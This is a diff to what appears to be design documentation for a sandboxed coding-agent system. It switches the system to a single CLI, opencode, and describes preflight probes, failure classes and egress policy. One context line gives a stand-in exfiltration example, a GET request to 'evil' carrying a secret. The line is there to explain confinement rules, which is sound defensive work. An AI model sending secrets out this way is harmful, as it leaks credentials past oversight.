@@ -154,7 +154,7 @@ could be configured with only `[openshell.drivers.docker]` while still logging
 image store. This mismatch is resolved in OpenShell 0.0.72 (the current fleet
 pin). `bootstrap-openshell.sh` retains the `mirror_image_for_openshell_runtime`
 step as belt-and-suspenders, and still runs an `openshell sandbox create` smoke
-test that verifies `gh` and `codex` are visible. Bootstrap then
+test that verifies `gh` and `opencode` are visible. Bootstrap then
 runs `live-confinement-probe.sh` inside a second throwaway sandbox and fails
 closed unless the runtime proves the expected filesystem, egress, privilege,
 seccomp, user-namespace, and raw-socket boundaries.
@@ -379,15 +379,14 @@ axis, because `GET https://evil/?x=<secret>` is exfiltration with a GET.
    appears in OpenShell logs, `/action-events`, the dashboard Observability
    action feed, memory summary eligibility, and OTLP export.
 
-## Coding-agent CLIs in the sandbox
+## The coding CLI in the sandbox
 
 ### opencode through the hub model router
 
-MAC's coding CLI is opencode. `MAC_CODING_AGENT` unset selects it;
-`MAC_CODING_AGENT=auto` restores the multi-CLI selection described below until
-those detectors are removed. opencode gets its model from the hub's
+MAC supports exactly one coding CLI: opencode. It gets its model from the hub's
 OpenAI-compatible router (`$MAC_HUB_URL/v1`), which fails over across the
-providers in `MAC_ROUTER_PROVIDERS`.
+providers in `MAC_ROUTER_PROVIDERS`. Provider failover lives only there; the
+executor never re-runs a task on a different CLI.
 
 The worker token never enters the sandbox: it can claim tasks and write the
 ledger. Instead, for each task:
@@ -433,44 +432,44 @@ The in-sandbox preflight mints a 15-minute token of its own and revokes it
 after the probe. Each logical model name must be one the hub's
 `MAC_ROUTER_PROVIDERS` aliases for every provider in its failover order.
 
-### Other coding CLIs
+### The in-sandbox route proof
 
-The executor prefers an installed, authenticated coding-agent CLI (Claude Code,
-Codex, Cursor) over a direct LLM-gateway run, because those CLIs authenticate
-against a subscription/seat instead of a metered API token (see
-`src/mac/coding_agent.py`). A coding-agent run is launched exactly like the
-Hermes run — inside the same OpenShell sandbox, under the same policy — so the
-guardrails are unchanged.
-
-**Working outside the sandbox is not sufficient to enable a coding CLI.** When
+**Working outside the sandbox is not sufficient to enable the coding CLI.** When
 OpenShell confinement is in effect (the per-task wrap *or* the supervisor — i.e.
-`MAC_OPENSHELL_REQUIRED` truthy / the agent is required), coding-agent
-enablement is **gated on a real in-sandbox preflight**: a throwaway sandbox runs
-the CLI under the live policy + forwarded env and must echo a sentinel back,
-proving end-to-end that the **binary exists, credentials resolve, and egress to
-the provider is permitted** in the sandbox.
+`MAC_OPENSHELL_REQUIRED` truthy / the agent is required), the route is **gated
+on a real in-sandbox preflight**: a throwaway sandbox runs opencode under the
+live policy with a short-lived inference token and must echo a sentinel back,
+proving end to end that the **binary exists, the token is accepted, and egress
+to the hub router is permitted** in the sandbox.
 
 The worker runs this probe before dispatch and publishes a secret-free
-`mac.coding_clis.v2` heartbeat record containing the CLI, provider, wire
-protocol, endpoint, authentication kind/source, model, route fingerprint, and
-the matching `mac.coding_agent.verification.v1` result. Repository dispatch to
-an OpenShell agent requires a fresh successful proof. A task-pinned model also
-requires proof for that exact model. Presence of a binary, credential variable,
-or credential directory is only `configured`; it is never `verified`.
+`mac.coding_clis.v2` heartbeat record with a single `opencode` entry: provider,
+wire protocol, endpoint, authentication kind/source, model, route fingerprint,
+and the matching `mac.coding_agent.verification.v1` result. Repository dispatch
+to an OpenShell agent requires a fresh successful proof for that entry. A
+task-pinned model also requires proof for that exact model. Presence of the
+binary and a hub credential is only `configured`; it is never `verified`.
 
 A failed probe carries a `failure_class` in that
-`mac.coding_agent.verification.v1` record so the failure names its own repair.
-Two of those classes are easy to confuse because the sandbox proxy denies
-egress with the same HTTP status a provider uses to reject a credential:
+`mac.coding_agent.verification.v1` record. It is derived from the exit status
+and from structured JSON error objects only; free-text output is never
+searched, because matching words in a transcript misclassifies runs (a sandbox
+named `mac-task-429907755059` was once classed as rate limited).
 
-| `failure_class` | Meaning | Repair |
+| `failure_class` | Source | Meaning |
 | --- | --- | --- |
-| `sandbox_policy_denied` | The OpenShell egress policy refused the destination — the response carries a policy sentinel such as `policy_denied` or `not permitted by policy`. | Allow the endpoint in the sandbox policy / fix the route. The credential is untouched. |
-| `authentication_failed` | A genuine `401`/`403` (or an explicit invalid-key message) from the provider, with no policy sentinel. | Repair the credential (`mac creds-sync`). |
+| `timeout` | exit 124 or 137 | The probe ran past `MAC_CODING_AGENT_PREFLIGHT_TIMEOUT`. |
+| `agent_binary_missing` | exit 126 or 127 | `opencode` is not runnable on the image PATH. |
+| `sandbox_policy_denied` | `{"error": "policy_denied", ...}` | The OpenShell egress policy refused the destination. The credential is untouched. |
+| `authentication_failed` | JSON error code `invalid_api_key`/`unauthorized`, or status 401/403 | The hub rejected the inference token. |
+| `rate_limited` | JSON error code `rate_limit_exceeded`/`rate_limit_error`, or status 429 | The router throttled the probe. |
+| `provider_server_error` | JSON error status 5xx | The router or its provider failed the call. |
+| `inference_token_unavailable` | — | The worker could not mint the probe's token. |
+| `sentinel_missing` | exit 0 | opencode ran but did not echo the sentinel. |
+| `probe_failed` | anything else | Read the probe output. |
 
-Because a policy denial proves the CLI launched and opened a socket, its
-`binary_status` is `present`, and it is deliberately *not* reported as a CLI
-needing a credential sync.
+A policy denial or an authentication failure proves opencode launched and
+opened a socket, so its `binary_status` is `present`.
 
 The executor repeats the same fail-closed check after claim. If the selected
 CLI fails and the progress observer proves that the sandbox is clean and has no
@@ -522,56 +521,39 @@ uncommitted, provide the original `--evidence-id`, and add `--execute`. MAC
 revalidates the preserved HEAD, commits any pending work with stalled-finalizer
 provenance, rebases, reruns both gates, and performs the shared guarded push.
 
-For a coding agent to pass the preflight, the deployment must ensure, **inside
-the sandbox**:
+For opencode to pass the preflight, the deployment must ensure, **inside the
+sandbox**:
 
-1. **Binary present** — `claude` / `codex` / `cursor-agent` is in the sandbox
-   image (or uploaded via `MAC_OPENSHELL_CREATE_ARGS`). The standard MAC image
-   installs `codex`.
-2. **Credentials reachable and durable** — supported environment routes
-   (`ANTHROPIC_API_KEY`, `ANTHROPIC_AUTH_TOKEN`, `CLAUDE_CODE_OAUTH_TOKEN`,
-   `CURSOR_AUTH_TOKEN`, `CURSOR_API_KEY`, `MAC_CODEX_TOKEN`, `CODEX_API_KEY`,
-   `OPENAI_API_KEY`) are
-   forwarded automatically. File-based Codex OAuth state
-   (`~/.codex/auth.json`) is not uploaded by default because OpenShell upload is
-   copy-only: a throwaway sandbox can consume and rotate the refresh token while
-   the replacement is lost with the sandbox. `bootstrap-openshell.sh` only
-   uploads Codex file auth when `MAC_OPENSHELL_UPLOAD_CODEX_AUTH=1`, and the
-   executor only retains and probes that upload when
-   `MAC_OPENSHELL_ALLOW_CODEX_FILE_AUTH=1` is also still set. A stale rendered
-   upload is removed at execution time, and `OPENAI_API_KEY` always suppresses
-   the file copy because environment auth wins.
+1. **Binary present** — the standard MAC image installs `opencode` and gates the
+   build on `command -v opencode`.
+2. **A hub credential on the host** — the worker needs `MAC_HUB_URL` and its
+   worker token to mint the inference token. No provider credential or
+   opencode `auth.json` is copied into the sandbox.
 3. **Baseline repo tools present** — the MAC OpenShell image installs `git`
    and `gh`; custom images must provide the same baseline if they
    are used for repository work.
 4. **Egress allowed** — the OpenShell policy's `network_policies` must permit the
-   hub/gateway, provider host (e.g. `api.anthropic.com`), git host, and Python
-   package index hosts used by repository bootstrap (`pypi.org` and
-   `files.pythonhosted.org` in the standard policy). The bundled fail-closed
-   default denies all egress, so the preflight fails closed there by design.
+   hub (`mac_hub`, and `opencode_router` for the two inference routes), the git
+   host, and Python package index hosts used by repository bootstrap
+   (`pypi.org` and `files.pythonhosted.org` in the standard policy). The bundled
+   fail-closed default denies all egress, so the preflight fails closed there by
+   design.
 
 ### Environment knobs
 
 | Variable | Default | Meaning |
 | --- | --- | --- |
-| `MAC_PREFER_CODING_AGENT` | `1` | master switch; `0` always uses the Hermes → gateway path |
-| `MAC_CODING_AGENT` | _(auto)_ | pin to `claude`/`codex`/`cursor`, or `off` to disable |
+| `MAC_PREFER_CODING_AGENT` | `1` | master switch; `0` disables the coding route and the executor fails closed |
+| `MAC_CODING_AGENT` | _(opencode)_ | `off` disables the coding route; any value other than `opencode` is ignored |
 | `MAC_CODING_AGENT_SANDBOX` | `verify` | `verify` = gate on the in-sandbox preflight; `trust` = assume the image is provisioned (skip the probe); `off` = never use a coding agent when confined |
 | `MAC_CODING_AGENT_PREFLIGHT_TIMEOUT` | `180` | seconds for the in-sandbox preflight |
 | `MAC_CODING_AGENT_PREFLIGHT_TTL_SECONDS` | `900` | successful route-proof lifetime in the executor/worker process |
 | `MAC_CODING_AGENT_PREFLIGHT_FAILURE_TTL_SECONDS` | `60` | retry interval for a failed route proof |
 | `MAC_WORKER_CODING_ROUTE_PROBE_INTERVAL_SECONDS` | success `900`, failure `60` | worker heartbeat probe cadence |
 | `MAC_CODING_ROUTE_MAX_AGE_SECONDS` | `1200` | maximum proof age accepted by dispatch |
-| `MAC_CODING_AGENT_<AGENT>_CMD` | _(built-in)_ | override a CLI's invocation (shlex-split); prompt appended as the trailing arg |
-| `MAC_CODING_AGENT_MESSAGING_MCP` | `1` | register the messaging MCP server (unconfined path only, Claude) |
 | `MAC_OPENSHELL_REPO_REQUIRES_CODING_AGENT` | `1` in fleet deploy | executor strict mode: repository tasks fail closed unless a coding CLI is verified in-sandbox |
-| `MAC_OPENSHELL_UPLOAD_CODEX_AUTH` | `0` | bootstrap opt-in to upload `~/.codex/auth.json` / `config.toml` into sandboxes |
-| `MAC_OPENSHELL_ALLOW_CODEX_FILE_AUTH` | `0` | executor opt-in to probe/use uploaded Codex file auth despite refresh-token rotation risk |
-| `MAC_CODEX_BASE_URL` | `OPENAI_BASE_URL` | explicit Codex provider endpoint; use a Responses-compatible endpoint |
-| `MAC_CODEX_TOKEN` | _(unset)_ | bearer read by Codex through `env_key`; the value never appears in argv or telemetry |
-| `MAC_CODEX_PROVIDER` | inferred | secret-free custom provider id (`openai` for the built-in endpoint, otherwise `mac-router`) |
-| `MAC_CODEX_WIRE_API` | `responses` | Codex wire protocol recorded and rendered into per-run custom-provider config |
-| `MAC_CODEX_MODEL` | fleet/task default | model included in the route fingerprint and dispatch proof |
+| `MAC_CODING_MODELS` | `gpt-5.6-sol` | logical models the generated opencode config declares |
+| `MAC_CODING_DEFAULT_MODEL` | `gpt-5.6-sol` | model opencode runs on when the task does not pin one |
 
 Set `MAC_CODING_AGENT_SANDBOX=trust` only after validating the image+policy out
 of band; it skips the per-task proof. `python -m mac.coding_agent` prints the
